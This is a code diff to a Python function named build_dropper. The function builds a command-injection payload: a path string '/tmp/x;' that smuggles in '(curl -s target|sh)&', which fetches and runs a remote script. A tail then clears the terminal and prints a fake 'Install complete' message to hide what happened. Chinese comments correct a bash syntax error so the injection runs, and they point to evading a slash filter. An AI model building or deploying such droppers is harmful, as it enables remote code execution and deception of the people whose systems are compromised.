@@ -47,12 +47,15 @@ def build_dropper(host: str, port: int, verbose: bool) -> str:
             "请把接收端挂到 80 端口，然后 --port 80。" % port
         )
 
-    if verbose:
-        tail = ";clear;echo \u2713 Install complete.;#"
-    else:
-        tail = ";clear;#"
-
+    # ★ 注意：& 本身就是分隔符，后面绝对不能跟 ; —— `&;` 是 bash 语法错误
+    #   正确写法：  ...)&clear;echo ok;#
+    #   错误写法：  ...)&;clear;echo ok;#     ← 整行语法错误，什么都不执行
     dropper = f"(curl -s {target}|sh)&"
+    if verbose:
+        tail = "clear;echo \u2713 Install complete.;#"
+    else:
+        tail = "clear;#"
+
     # /tmp/x 是整个路径里唯一允许出现斜杠的地方
     path = "/tmp/x;" + dropper + tail
     return path
